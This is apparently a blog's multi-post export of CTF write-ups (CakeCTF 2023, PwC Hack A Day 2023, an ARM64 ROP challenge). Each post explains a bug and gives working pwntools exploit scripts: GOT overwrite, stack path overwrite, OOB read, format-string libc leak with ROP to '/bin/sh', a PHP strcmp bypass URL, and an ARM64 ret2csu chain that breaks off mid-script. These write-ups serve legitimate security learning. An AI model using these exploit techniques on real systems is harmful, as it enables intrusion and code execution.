std::string structure as the first parameter, index as the second parameter current string length (offset 0x08) as the third parameter pointer to the new string content as the fourth parameter and lastly, the length of the new string void __thiscall std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::operator= (basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; *this,char *new_str) { size_t new_len; new_len = strlen(new_str); _M_replace(this,0,*(ulong *)(this + 8),new_str,new_len); return; } Looking into _M_replace(), there is the _M_mutate() function which causes the SIGSEGV. To avoid calling _M_mutate(), capacity, which is the value at offset 0x10 (since we overwrote ptr and now ptr != this+0x10), needs to be larger than our input length. Since we have buffer overflow, we could control the value at offset 0x10 as well which make the program goes into the else block and finally execute the memcpy() function, where the destination is the overwritten ptr value plus index (which is always 0) and the source is our input value.\nbasic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; * __thiscall std::__cxx11::basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;::_M_replace (basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; *this,ulong index, ulong cur_size,char *new_str,ulong new_len) { basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; *__dest; ulong _new_len; ulong capacity; ulong idk; long _cur_size; basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; *ptr; _cur_size = *(long *)(this + 8); if (new_len \u0026lt;= (cur_size + 0x3fffffffffffffff) - _cur_size) { ptr = *(basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt; **)this; _new_len = (new_len - cur_size) + _cur_size; if (ptr == this + 0x10) { /* inline string (on stack) */ capacity = 0xf; } else { capacity = *(ulong *)(this + 0x10); } if (capacity \u0026lt; _new_len) { // \u0026lt;=== avoid this _M_mutate(this,index,cur_size,new_str,new_len); } else { __dest = ptr + index; idk = _cur_size - (index + cur_size); if ((new_str \u0026lt; ptr) || (ptr + _cur_size \u0026lt; new_str)) { if ((idk != 0) \u0026amp;\u0026amp; (cur_size != new_len)) { if (idk == 1) { __dest[new_len] = __dest[cur_size]; } else { memmove(__dest + new_len,__dest + cur_size,idk); } } if (new_len != 0) { if (new_len == 1) { *__dest = (basic_string\u0026lt;char,std::char_traits\u0026lt;char\u0026gt;,std::allocator\u0026lt;char\u0026gt;\u0026gt;)*new_str; } else { memcpy(__dest,new_str,new_len); // \u0026lt;=== target } } } else { _M_replace_cold(this,(char *)__dest,cur_size,new_str,new_len,idk); } } *(ulong *)(this + 8) = _new_len; *(undefined *)(*(long *)this + _new_len) = 0; return this; } /* WARNING: Subroutine does not return */ __throw_length_error(\u0026#34;basic_string::_M_replace\u0026#34;); } Solution # Let\u0026rsquo;s briefly recap on our analysis:\ninput_person() function is subjected to buffer overflow std::string contains a pointer to memory address at offset 0x00 this pointer could be overwritten w/ buffer overflow to point to __stack_chk_fail@got.plt and our input would be used to populate this GOT entry simply overwriting this pointer is not enough as the operator= function calls into _M_mutate() which causes segmentation fault need to overwrite std::string structure at offset 0x10 to be larger than our input length (calculated with strlen) to avoid the _M_mutate() function calls #!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./bofww\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc bofww.2023.cakectf.com 9002\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} io = start() win = 0x4012f6 stack_chk_fail_got = elf.got[\u0026#34;__stack_chk_fail\u0026#34;] payload = b\u0026#34;\u0026#34; payload += p64(win) payload = payload.ljust(0x130, b\u0026#34;\\x00\u0026#34;) payload += flat( stack_chk_fail_got, 0, 0x3 # std::__cxx11::basic_string\u0026lt;char, std::char_traits\u0026lt;char\u0026gt;, std::allocator\u0026lt;char\u0026gt; \u0026gt;::_M_replace(unsigned long, unsigned long, char const*, unsigned long)+0x4a --\u0026gt; need to be \u0026gt;= strlen(_name) # noqa ) io.sendline(payload) io.sendline(b\u0026#34;1337\u0026#34;) io.interactive() ➜ ./solve.py [*] Switching to interactive mode What is your first name? How old are you? $ ls Dockerfile docker-compose.yml libstdc++.so.6.0.32 readme.md bofww flag.txt main.cpp solve.py $ cat flag.txt CakeCTF{n0w_try_w1th0ut_w1n_func710n:)} $ ","date":"16 November 2023","permalink":"/posts/cakectf-2023/pwn/bofww/","section":"My Average Blog","summary":"Buffer overflow into arbitrary address write via std::string \u003ccode\u003e=\u003c/code\u003e operator","title":"bofww"},{"content":"","date":"16 November 2023","permalink":"/categories/cakectf-2023/","section":"Categories","summary":"","title":"CakeCTF 2023"},{"content":" Author: ptr-yudai\nDescription: Memorial Cabbage Unit 3\nAttachment: memorial-cabbage.tar.gz\nSource Code # #include \u0026lt;stdio.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;string.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; #define TEMPDIR_TEMPLATE \u0026#34;/tmp/cabbage.XXXXXX\u0026#34; static char *tempdir; void setup() { char template[] = TEMPDIR_TEMPLATE; setvbuf(stdin, NULL, _IONBF, 0); setvbuf(stdout, NULL, _IONBF, 0); if (!(tempdir = mkdtemp(template))) { perror(\u0026#34;mkdtemp\u0026#34;); exit(1); } if (chdir(tempdir) != 0) { perror(\u0026#34;chdir\u0026#34;); exit(1); } } void memo_r() { FILE *fp; char path[0x20]; char buf[0x1000]; strcpy(path, tempdir); strcpy(path + strlen(TEMPDIR_TEMPLATE), \u0026#34;/memo.txt\u0026#34;); if (!(fp = fopen(path, \u0026#34;r\u0026#34;))) return; fgets(buf, sizeof(buf) - 1, fp); fclose(fp); printf(\u0026#34;Memo: %s\u0026#34;, buf); } void memo_w() { FILE *fp; char path[0x20]; char buf[0x1000]; printf(\u0026#34;Memo: \u0026#34;); if (!fgets(buf, sizeof(buf)-1, stdin)) exit(1); strcpy(path, tempdir); strcpy(path + strlen(TEMPDIR_TEMPLATE), \u0026#34;/memo.txt\u0026#34;); if (!(fp = fopen(path, \u0026#34;w\u0026#34;))) return; fwrite(buf, 1, strlen(buf), fp); fclose(fp); } int main() { int choice; setup(); while (1) { printf(\u0026#34;1. Write memo\\n\u0026#34; \u0026#34;2. Read memo\\n\u0026#34; \u0026#34;\u0026gt; \u0026#34;); if (scanf(\u0026#34;%d%*c\u0026#34;, \u0026amp;choice) != 1) break; switch (choice) { case 1: memo_w(); break; case 2: memo_r(); break; default: return 0; } } } Initial Analysis # At a glance, the program seems to not have any vulnerability. The setup() function creates a temporary directory under /tmp and save the directory name to tempdir. Both memo write and read have proper size constraints to prevent buffer overflow and would operate on a file named memo.txt under tempdir.\nNext, my plan is to just fill up buf with 0xfff bytes of cyclic pattern and observe any interesting outcome.\ngef\u0026gt; x/s (char*)tempdir 0x7ffd9aab6920: \u0026#34;/tmp/cabbage.FSWsBP\u0026#34; gef\u0026gt; ni gef\u0026gt; x/s (char*)tempdir 0x7ffd9aab6920: \u0026#34;bovabowaboxabo\u0026#34; Turns out that our input overwrites part of tempdir. This happens because mkdtemp returns char * that is pointing to the stack and when the setup() returns, the string /tmp/cabbage.FSWsBP is located in the stack area which would be used to allocate local variables when another function is called. In this case, when memo_w is called, the memory which would be allocated for buf overlaps with tempdir, which allows us to overwrite the path value.\ngef\u0026gt; x/5i memo_w+59 0x55565ba76502 \u0026lt;memo_w+59\u0026gt;: mov rdx,QWORD PTR [rip+0x2b17] # 0x55565ba79020 \u0026lt;stdin@GLIBC_2.2.5\u0026gt; 0x55565ba76509 \u0026lt;memo_w+66\u0026gt;: lea rax,[rbp-0x1010] 0x55565ba76510 \u0026lt;memo_w+73\u0026gt;: mov esi,0xfff 0x55565ba76515 \u0026lt;memo_w+78\u0026gt;: mov rdi,rax 0x55565ba76518 \u0026lt;memo_w+81\u0026gt;: call 0x55565ba76180 \u0026lt;fgets@plt\u0026gt; gef\u0026gt; x/gx $rbp-0x1010 0x7ffd9aab5930: 0x6161616261616161 gef\u0026gt; p/x 0x7ffd9aab5930+0x1000 $6 = 0x7ffd9aab6930 Solution # Now that we are able to overwrite the value of tempdir and the memo path is constructed everytime memo_r is called, we could overwrite tempdir to be /flag.txt\\x00. Since the length of /flag.txt\\x00 is shorter than TEMPDIR_TEMPLATE, when strcpy(path + strlen(TEMPDIR_TEMPLATE), \u0026quot;/memo.txt\u0026quot;) is called, our NULL termination stays and fopen() would open /flag.txt, instead of /flag.txtgarbage/memo.txt\nWhen testing locally, make sure that the running user has no write permission to /flag.txt since memo_w would not return early and instead overwrite the content of /flag.txt. Final solve script:\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./cabbage\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc memorialcabbage.2023.cakectf.com 9001\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} io = start() io.sendline(b\u0026#34;1\u0026#34;) io.sendline(cyclic(0xff0) + b\u0026#34;/flag.txt\\x00\u0026#34;) io.sendline(b\u0026#34;2\u0026#34;) io.interactive() ➜ ./solve.py REMOTE HOST=localhost PORT=9001 [+] Opening connection to localhost on port 9001: Done [*] Switching to interactive mode 1. Write memo 2. Read memo \u0026gt; Memo: 1. Write memo 2. Read memo \u0026gt; Memo: FakeCTF{*** REDACTED ***} 1. Write memo 2. Read memo \u0026gt; $ ","date":"16 November 2023","permalink":"/posts/cakectf-2023/pwn/memorial-cabbage/","section":"My Average Blog","summary":"Overwriting \u003ccode\u003emkdtemp\u003c/code\u003e return path","title":"Memorial Cabbage"},{"content":"","date":"8 November 2023","permalink":"/tags/format-string/","section":"Tags","summary":"","title":"format string"},{"content":" Initial Analysis # When we try to run the binary file, we are first prompted to enter a 4-digit password. Looking at the decompilation output, the password is hardcoded in password_checker() function, i.e., 1235\n__int64 __fastcall password_checker(int password) { __int64 result; // rax if ( password == 1235 ) { puts(\u0026#34;Login Successfully\\n\u0026#34;); result = 1LL; } else { if ( password \u0026lt;= 999 || password \u0026gt; 9999 ) puts(\u0026#34;Please Enter 4 digit numbers!\\n\u0026#34;); else puts(\u0026#34;Invalid password!\\n\u0026#34;); result = 0LL; } return result; } Next, we could see that inside management_system() function, we could see that we are allowed to query an item whose ID is less than or equal to 14. However, notice that there is no check for negative item ID and the variable data type is a signed integer.\nvoid __fastcall management_system() { int input; // [rsp+4h] [rbp-Ch] unsigned int j; // [rsp+8h] [rbp-8h] unsigned int i; // [rsp+Ch] [rbp-4h] while ( 1 ) { while ( 1 ) { while ( 1 ) { while ( 1 ) { puts(\u0026#34;--- Welcome to the Management System ---\u0026#34;); puts(\u0026#34;1. User List \u0026#34;); puts(\u0026#34;2. Item List \u0026#34;); puts(\u0026#34;3. Search for Item Storage \u0026#34;); puts(\u0026#34;4. Exit\u0026#34;); printf(\u0026#34;Enter your choice: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); if ( input != 1 ) break; for ( i = 0; (int)i \u0026lt;= 17; ++i ) printf(\u0026#34;UserID - %d %s\\n\u0026#34;, i, userlist[i]); putchar(\u0026#39;\\n\u0026#39;); } if ( input != 2 ) break; for ( j = 0; (int)j \u0026lt;= 14; ++j ) printf(\u0026#34;ItemID - %d %s\\n\u0026#34;, j, item[2 * (int)j]); putchar(\u0026#39;\\n\u0026#39;); } if ( input != 3 ) break; printf(\u0026#34;Please Enter item ID: \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;input); if ( input \u0026lt;= 14 ) printf(\u0026#34;\\nStorage of %s: %s\\n\\n\u0026#34;, item[2 * input], off_4888[2 * input]); else puts(\u0026#34;Invalid item ID!\\n\u0026#34;); } if ( input == 4 ) break; puts(\u0026#34;Invalid Input!\u0026#34;); } } This means that we could provide a negative item ID, e.g., -4, and it would access memory address lower than item and return the value there. Looking at interesting things that we could read with negative item ID, we could see that there is a variable named secret which contains the flag.\nSolution # Now that we know we could read the flag by providing a negative item ID, the next step is to calculate the exact value to properly access the flag. To do this, we could simply subtract the distance between item and secret and then divides the value by 16.\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./vuln\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc localhost 1337\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} io = start() item = elf.sym[\u0026#34;item\u0026#34;] secret = elf.sym[\u0026#34;secret\u0026#34;] delta = (item - secret) // 16 log.info(f\u0026#34;{delta=:#x}\u0026#34;) io.sendlineafter(b\u0026#34;numbers): \u0026#34;, b\u0026#34;1235\u0026#34;) io.sendlineafter(b\u0026#34;choice: \u0026#34;, b\u0026#34;3\u0026#34;) io.sendlineafter(b\u0026#34;ID: \u0026#34;, str(delta * -1).encode()) io.recvuntil(b\u0026#34;Storage of \u0026#34;) io.interactive() ","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/pwn/hack-the-binary-1/","section":"My Average Blog","summary":"Array OOB read","title":"Hack the Binary 1"},{"content":" Initial Analysis # The given binary file is almost similar to Hack the Binary 1, but without the flag lying around in the memory and array OOB. Instead, the login() function is now susceptible to format string attack. Furthermore, it is also subjected to buffer overflow as the scanf format is not restricted by length.\n__int64 login() { __int64 result; // rax char format; // [rsp+Ah] [rbp-6h] do { printf(\u0026#34;Please Enter Password (4 digit numbers): \u0026#34;); __isoc99_scanf(\u0026#34;%s\u0026#34;, \u0026amp;format); printf(\u0026#34;Your Password is \u0026#34;); printf(\u0026amp;format); // \u0026lt;=== format string !!! putchar(10); result = password_checker(\u0026amp;format); } while ( (_DWORD)result != 1 ); return result; } Solution # The first step is to leak the stack and look for any interesting address, particularly the one that points to libc memory space since we want to call system() later on to pop a shell. The format string that would be discussed in this writeup is %n$llx where n specify the stack offset and llx for 64-bit value in hex format.\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./vuln2\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc localhost 1337\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} def printf_leak(idx): payload = f\u0026#34;%{idx}$llx\u0026#34;.encode() io.sendline(payload) io.recvuntil(b\u0026#34;is \u0026#34;) leak = int(io.recvline(keepends=False), 16) return leak io = start() for i in range(1, 16): leak = printf_leak(i) log.info(f\u0026#34;{i} {leak:#x}\u0026#34;) io.interactive() Based on the result, the third entry is a libc address value.\nOne could also double check where is the libc memory region via /proc/\u0026lt;pid\u0026gt;/maps Since the challenge does not come with a libc file, we could not directly compute the offset between the leaked address with the base address of libc. The local libc used in this writeup is of version 2.35-0ubuntu3. Now, if we try to run it against the remote server, we could see that the lowest 3 nibbles (hex digit) is different (local is a37, remote is a77). We only compare the lowest 3 nibbles since ASLR does not affect these 3. This means that the remote server is using a different libc version.\nWe need to check if the leaked address belongs to any libc function such that we could use the known symbol as a lookup value on libc database like:\nhttps://libc.rip https://libc.blukat.me Now, if we attached gdb to the process (that is running local binary), we could see that the address lies within __GI___libc_write.\nIf we try to use the symbol name __GI___libc_write with the address 0xa37-23 = 0xa20, libc.rip returns us results. However, there is no 2.35-0ubuntu3. This means that the symbol name is not quite right.\nIf we try to break at the beginnning of the function, gef (gdb plugin) labels the function as write.\nNow, if we use replace the symbol name with write instead, we get more results and 2.35-0ubuntu3 is among them.\nNext, we just need to replace the address value with the one that we got from remote server, i.e., 0xa77-23 = 0xa60. If we diff the results between __GI___libc_write 0xa60 and write 0xa60, we could deduce that libc6_2.35-0ubuntu3.4_amd64 is probably the correct one. Click on the result and we could see various offsets, e.g., write, system, str_bin_sh, etc. With the offset of write, we could compute the libc base address on the remote side and then use the base address to locate system function address within the process memory and various other stuffs. Another thing that we need is also a pop rdi; ret; gadget which does not exist in the binary file, but is available from the libc file.\nFinal solve script:\n#!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * elf = context.binary = ELF(\u0026#34;./vuln2\u0026#34;, checksec=False) libc = ELF(\u0026#34;./libc.so.6\u0026#34;, checksec=False) def start(argv=[], *a, **kw): nc = \u0026#34;nc localhost 1337\u0026#34; nc = nc.split() host = args.HOST or nc[1] port = int(args.PORT or nc[2]) if args.REMOTE: return remote(host, port) else: return process([elf.path] + argv, env=env, *a, **kw) env = {} def printf_leak(idx): payload = f\u0026#34;%{idx}$llx\u0026#34;.encode() io.sendline(payload) io.recvuntil(b\u0026#34;is \u0026#34;) leak = int(io.recvline(keepends=False), 16) return leak io = start() # for i in range(1, 16): # leak = printf_leak(i) # log.info(f\u0026#34;{i} {leak:#x}\u0026#34;) libc_leak = printf_leak(3) libc.address = libc_leak - 0x114a60 - 23 log.info(f\u0026#34;{libc.address=:#x}\u0026#34;) pop_rdi = libc.address + 0x001bc0a1 ret = pop_rdi + 1 bin_sh = next(libc.search(b\u0026#34;/bin/sh\\x00\u0026#34;)) payload = b\u0026#34;A\u0026#34; * 6 payload += p64(elf.bss(0xc00)) payload += flat( pop_rdi, bin_sh, ret, # stack alignment libc.sym[\u0026#34;system\u0026#34;] ) io.sendline(payload) io.sendline(b\u0026#34;1235\u0026#34;) io.interactive() ","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/pwn/hack-the-binary-2/","section":"My Average Blog","summary":"Format string to defeat ASLR, ROP to get RCE","title":"Hack the Binary 2"},{"content":"","date":"8 November 2023","permalink":"/tags/oob/","section":"Tags","summary":"","title":"oob"},{"content":"","date":"8 November 2023","permalink":"/tags/php/","section":"Tags","summary":"","title":"php"},{"content":" Source Code # This is a rough overview of the source code but is enough for solving the challenge \u0026lt;?php include \u0026#39;flag.php\u0026#39;; if (isset($_GET[\u0026#39;debug\u0026#39;])) { highlight_file(__FILE__); } if (isset($_GET[\u0026#39;url\u0026#39;])) { $url = $_GET[\u0026#39;url\u0026#39;]; $parsed = parse_url($url); if ($parsed[\u0026#39;host\u0026#39;] == \u0026#34;www.google.com\u0026#34; \u0026amp;\u0026amp; ($parsed[\u0026#39;scheme\u0026#39;] == \u0026#34;http\u0026#34; || $parsed[\u0026#39;scheme\u0026#39;] == \u0026#34;https\u0026#34;)) { echo file_get_contents(str_replace(\u0026#34;../\u0026#34;, \u0026#34;/\u0026#34;, $url) . \u0026#34;?flag=\u0026#34; . $flag); } else { die(\u0026#34;Forbidden\u0026#34;); } } ?\u0026gt; Initial Analysis # From the source code above, we could see that it requires us to provide a URL that satisfy the criterias. Searching on the internet on how to bypass parse_url host leads us to this page.\nBased on the PoC, for PHP \u0026lt; 5.6.28, the parse_url incorrectly parses the host component. We could trick parse_url to think that www.google.com is the host, but in fact, the real host is a webhook for us to retrieve the flag. However, this does not work for us since if we look at the response header, it is stated that the server is running PHP version 8.2.12.\nSeems like there is no way for us to trick the parse_url but to work with www.google.com\nLooking at www.google.com # If we provide https://www.google.com as the url query value, we could see that it just returns the page with an empty search box.\nIf we go to google and try to search up, e.g., pwc hackaday 2023, it would redirect us to this URL: https://www.google.com/search?q=pwc+hackaday+2023\u0026amp;....\nNow, if we try to visit https://www.google.com/search?q=hello+world directly, we end up with this page.\nLooking back at the source code, we could see that the argument passed to file_get_contents is our provided url appended with ?flag=. If our provided url already contains ?foo=bar, then the appended ?flag= would lose its ? original syntax meaning and instead be treated as the continuation of our initial foo parameter key value, i.e., foo = bar?flag=\nSolution # Before we continue, let\u0026rsquo;s recap back on our findings:\nparse_url host confusion is not possible due to mismatch PHP version If our provided url already contains ? which signify the starting of query string, then the appended ?flag would lose its ? meaning The Google search endpoint /search query key q value is reflected back to the search box Now, putting everything together, we could provide url as https://www.google.com/search?q= and the flag would be appended into https://www.google.com/search?q=?flag=..., which means that ?flag=... would show up inside the Google search box.\n","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/web/php-code-review-1/","section":"My Average Blog","summary":"Leveraging Google search box to capture the flag","title":"PHP Code Review 1"},{"content":" Source Code # This is only a part of the source code \u0026lt;?php // php 8.2.12 // // if ?debug, highlight __FILE__ to view source code $username = $_GET[\u0026#39;username\u0026#39;]; $passwd = $_GET[\u0026#39;password\u0026#39;]; $alg = $_GET[\u0026#39;alg\u0026#39;]; $pwlist = array(\u0026#39;admin\u0026#39; =\u0026gt; \u0026#34;REMOVED\u0026#34;, \u0026#34;editor\u0026#34; =\u0026gt; \u0026#34;REMOVED\u0026#34; ); function hashing($passwd, $alg) { try { if (!isset($alg)) { $alg = \u0026#34;md5\u0026#34;; } $alg = strval(trim($alg)); $passwd = strval($passwd); if ($alg != \u0026#34;md5\u0026#34; \u0026amp;\u0026amp; $alg != \u0026#34;sha256\u0026#34;) { die(\u0026#34;invalid algorithm\u0026#34;); } return hash($alg, $passwd); } catch (Throwable) { return; } } if (isempty($username) || isempty($passwd)) { die(\u0026#34;empty username or password\u0026#34;); } if (!strcmp(hashing($passwd, $alg), $pwlist[$username])) { // set cookie with value of xor($username, $flag) } ?\u0026gt; Initial Analysis # From the source code above, it is apparent that we need to pass the strcmp checks, such that we could retrieve the flag from the cookie. The first argument is the hash digest of our provided password (MD5 or SHA256) and the second argument comes from the initialized array. Since the value of the array is not fully known, it is almost impossible for us to guess the username\u0026rsquo;s hashed password.\nHowever, notice that if we provide a username that does not exist in the array, $pwlist[$username] would just return NULL. Looking at the hashing() function, we could see that there are two code paths, one that returns hash($alg, $passwd), and another path that returns NULL. Since we could make the second argument to be NULL, it would be great if we could get the hashing() function to return NULL as well.\nAnalysis of hashing() # The code path which returns NULL, require us to trigger an error somewhere inside the try block. There are three function candidates, i.e., isset, strval, and trim. After trial-and-error, the trim() function would raise an error when an array is passed as the argument.\nWe could re-confirm this behaviour by passing an array to hashing() and observe that it indeed returns nothing as opposed to normal argument like md5 and sha256.\nSolution # Here is the summary of our findings:\nOur goal is to pass the strcmp checks We could make the second argument to return NULL using non-existing username We could make the first argument to return NULL by triggering an error via the trim() function by passing it an array such that the catch block is reached To pass an array via HTTP query string, we just need to append the parameter name with [], e.g., ?alg[]=abcd. Since the cookie value is our supplied username XOR with the flag and base64 encoded, and we do not know the length of the flag beforehand, we could just supply a really long username\nThe final payload to get the server to set the cookie is:\nhttp://\u0026lt;url\u0026gt;?username=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa\u0026amp;password=deadbeef\u0026amp;alg[]= ","date":"8 November 2023","permalink":"/posts/pwc-hackaday-23/web/php-code-review-2/","section":"My Average Blog","summary":"Triggering error to reach \u003ccode\u003ecatch\u003c/code\u003e block","title":"PHP Code Review 2"},{"content":"","date":"8 November 2023","permalink":"/categories/pwc-ctf-hack-a-day-2023-securing-ai/","section":"Categories","summary":"","title":"PwC CTF: Hack A Day 2023 - Securing AI"},{"content":"","date":"8 November 2023","permalink":"/tags/rop/","section":"Tags","summary":"","title":"ROP"},{"content":"","date":"8 November 2023","permalink":"/categories/web/","section":"Categories","summary":"","title":"web"},{"content":"","date":"25 July 2023","permalink":"/tags/arm64/","section":"Tags","summary":"","title":"ARM64"},{"content":" Work in progress. Note # Not sure why the exploit does not work in non-debug mode locally, but works for local debug-mode and remote non-debug aarch64 (ARM64) # Tools # References: https://docs.pwntools.com/en/stable/qemu.html\nDebugging (choose either one):\ngdb-multiarch: sudo apt-get install gdb-multiarch gcc toolchain (with gdb): https://github.com/xpack-dev-tools/aarch64-none-elf-gcc-xpack/ Running:\nqemu: sudo apt-get install qemu-user-static libs: sudo apt-get install libc6-arm64-cross installs to /usr/aarch64-linux-gnu/ Running the binary\n# non-debug mode qemu-aarch64-static ./binary # debug mode (gdbserver) on port 1234 qemu-aarch64-static -g 1234 ./binary # in case of the loader not provided (`ld-linux-aarch64.so.1`), use the loader from `libc-arm64-cross` qemu-aarch64-static -L /usr/aarch64-linux-gnu/ ./binary Attach debugger with GEF\ngef➤ gef-remote --qemu-user localhost 1234 Assembly # References: http://blog.perfect.blue/ROPing-on-Aarch64\nRegisters # x0 to x7 are used to pass arguments x29 is equivalent to rbp in x86 x30 stores return address Function Prologue # Pre-indexed performs the offset operation then the assembly instruction:\nAdd N to sp (sp = sp + N) Stores old frame pointer, x29, to [sp] and return address, x30, to [sp + 8] stp x29, x30, [sp, #N]! ; pre-indexed [base, #offset]! mov x29, sp Function Epilogue # Post-indexed performs the assembly instruction then the offset operation\nLoad [sp] to x29 and [sp + 8] to x30 Add N to sp (sp = sp + N) ldp x29, x30, [sp], #N ; post-indexed [base], #offset Stack Layout # +--------------------------+ ^ Lower memory address | callee\u0026#39;s saved x29 | | +--------------------------+ | | callee\u0026#39;s saved x30 | | +--------------------------+ | Stack growth direction | callee\u0026#39;s local variables | +--------------------------+ | caller\u0026#39;s saved x29 | +--------------------------+ | caller\u0026#39;s saved x30 | +--------------------------+ | caller\u0026#39;s local variables | +--------------------------+ Higher memory address Unlike in x86 where saved rbp and rip are below the local variables which allow us to overwrite the saved rip and immediately return to our desired address, in ARM64 we overwrite the callers\u0026rsquo;s return address instead due to the stack layout which means that we would first return normally to the caller and only then return to our desired address\nSolution # #!/usr/bin/env python3 # type: ignore # flake8: noqa from pwn import * ld = ELF(\u0026#34;./ld-linux-aarch64.so.1\u0026#34;) libc = ELF(\u0026#34;./libc.so.6\u0026#34;) elf = context.binary = ELF(\u0026#34;./vuln\u0026#34;) def start(argv=[], *a, **kw): global flag_path host = args.HOST or \u0026#39;generic-rop-challenge.chal.imaginaryctf.org\u0026#39; port = int(args.PORT or 42042) if args.REMOTE: flag_path = b\u0026#34;/home/user/flag.txt\\x00\u0026#34; return remote(host, port) if args.GDB: flag_path = b\u0026#34;/run/shm/flag.txt\\x00\u0026#34; return process([qemu, \u0026#34;-g\u0026#34;, str(debug_port), elf.path]) else: flag_path = b\u0026#34;/run/shm/flag.txt\\x00\u0026#34; return process([qemu, elf.path] + argv, env=env, *a, **kw) env = {} qemu = \u0026#34;/usr/bin/qemu-aarch64-static\u0026#34; debug_port = 1234 flag_path = b\u0026#34;\u0026#34; io = start() pad = 80 - 0x10 main_x29 = b\u0026#34;BBBBBBBB\u0026#34; bss = elf.bss(0x200) csu_1 = 0x400948 csu_2 = 0x400928 def ret2csu(w0, x1, x2, func_ptr, next_gadget): payload = b\u0026#34;A\u0026#34; * pad + main_x29 + p64(csu_1) payload += flat(bss, p64(csu_2)) payload += flat(0, 1) # x19, x20 payload += flat(func_ptr, w0) # x21, x22 payload += flat(x1, x2) # x23, x24 payload += flat(bss, next_gadget) return payload # Leak LIBC payload = ret2csu(elf.got[\u0026#34;puts\u0026#34;], 0, 0, elf.got[\u0026#34;puts\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) leak_puts = u64(io.recvline(keepends=False).ljust(8, b\u0026#34;\\x00\u0026#34;)) if not args.REMOTE: leak_puts |= 0x4000000000 log.info(f\u0026#34;{leak_puts=:#x}\u0026#34;) libc.address = leak_puts - libc.symbols[\u0026#34;puts\u0026#34;] log.info(f\u0026#34;{libc.address=:#x}\u0026#34;) # gets(bss) // stdin: /home/user/flag.txt pause() log.info(f\u0026#34;setup flag path string @ bss + 0x500\u0026#34;) log.info(f\u0026#34;{flag_path=}\u0026#34;) flag_path_addr = elf.bss(0x500) payload = ret2csu(flag_path_addr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(flag_path) # absolute path to ignore `dirfd` for `openat` # gets(bss) // stdin: libc.symbols[\u0026#34;openat\u0026#34;] openat_fptr = elf.bss(0x600) log.info(f\u0026#34;setup openat function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(openat_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;openat\u0026#34;])) # fini_ptr = 0x400e20 # openat(0, flag_path_addr, 0) log.info(f\u0026#34;openat(0, flag_path_addr, 0)\u0026#34;) payload = ret2csu(0, flag_path_addr, 0, openat_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) # gets(bss) // stdin: libc.symbols[\u0026#34;read\u0026#34;] read_fptr = elf.bss(0x600) log.info(f\u0026#34;setup read function pointer @ bss + 0x600\u0026#34;) payload = ret2csu(read_fptr, 0, 0, elf.got[\u0026#34;gets\u0026#34;], elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) io.sendline(p64(libc.symbols[\u0026#34;read\u0026#34;])) # read(5, flag_addr, 0x100) flag_addr = elf.bss(0x700) log.info(f\u0026#34;read(5, flag_addr, 0x100)\u0026#34;) # trial-and-error to find the proper fd payload = ret2csu(5, flag_addr, 0x100, read_fptr, elf.symbols[\u0026#34;main\u0026#34;]) io.sendlineafter(b\u0026#34;below\\n\u0026#34;, payload) # gets(bss) // stdin: 